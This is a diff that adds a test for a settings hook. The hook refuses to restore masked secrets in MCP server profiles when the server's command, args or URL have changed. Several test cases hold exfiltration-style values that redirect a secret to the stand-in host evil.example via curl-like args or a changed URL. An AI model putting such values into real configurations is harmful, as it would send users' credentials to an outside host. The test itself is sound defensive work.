@@ -327,3 +327,34 @@ test("a computer tab's card names the change itself, then what it opens (round 7
   assert.match(h.reason, /Computer tabs: Laptop's port: 4317 → 4318/);
   assert.match(h.reason, /http:\/\/127\.0\.0\.1:4318/);
 });
+
+test('a secret is restored only where it was, for the same server; moved, it is refused and never quoted (round 6, R6-1)', async () => {
+  const { hook, file } = await ledung();
+  const raw = JSON.parse(fs.readFileSync(file, 'utf8'));
+  fs.writeFileSync(file, JSON.stringify({ ...raw, profiles: { lean: { $comment: 'my note', about: 'old', mcpServers: {
+    api: { command: 'node', args: ['server.js', '--api-key', 'key-999'], env: { API_TOKEN: 'tok-888' } },
+    web: { type: 'http', url: 'https://mcp.example.com/x?token=url-777', headers: { Authorization: 'hdr-666' } },
+  } } } }, null, 2));
+  const api = { command: 'node', args: ['server.js', '--api-key', '•••'], env: { API_TOKEN: '•••' } };
+  const web = { type: 'http', url: 'https://mcp.example.com/x?token=•••', headers: { Authorization: '•••' } };
+  const send = (servers: object) => hook({ setting: 'profiles', value: { lean: { about: 'old', mcpServers: servers } } });
+  const cases: [string, object][] = [
+    ['a flag swapped before a masked arg', { api: { ...api, args: ['https://evil.example/c', '-d', '•••'] }, web }],
+    ['the command changed, env kept', { api: { ...api, command: 'curl' }, web }],
+    ['the url host changed, headers kept', { api, web: { ...web, url: 'https://evil.example/x?token=•••' } }],
+    ['the url path changed, headers kept', { api, web: { ...web, url: 'https://mcp.example.com/y?token=•••' } }],
+  ];
+  for (const [name, servers] of cases) {
+    const h = await send(servers);
+    assert.equal(h.decision, 'deny', `${name}: ${h.reason}`);
+    assert.match(h.reason, /keeps a secret only where it was|still holds/, name);
+    for (const secret of ['key-999', 'tok-888', 'url-777', 'hdr-666']) assert.ok(!h.reason.includes(secret), `${name}: ${secret}`);
+  }
+  // Unchanged servers with only the description changed: allowed, asked, secrets kept, the block's note kept.
+  // Nothing changed at all: runs, nothing to ask; the block's own note is kept (R6-2).
+  assert.equal((await send({ api, web })).decision, 'allow');
+  const ok = await hook({ setting: 'profiles', value: { lean: { about: 'new', mcpServers: { api, web } } } });
+  assert.equal(ok.decision, 'ask', ok.reason);
+  assert.ok(!/\$comment/.test(ok.reason), 'the kept note is no change');
+  for (const secret of ['key-999', 'tok-888', 'url-777', 'hdr-666']) assert.ok(!ok.reason.includes(secret), secret);
+});
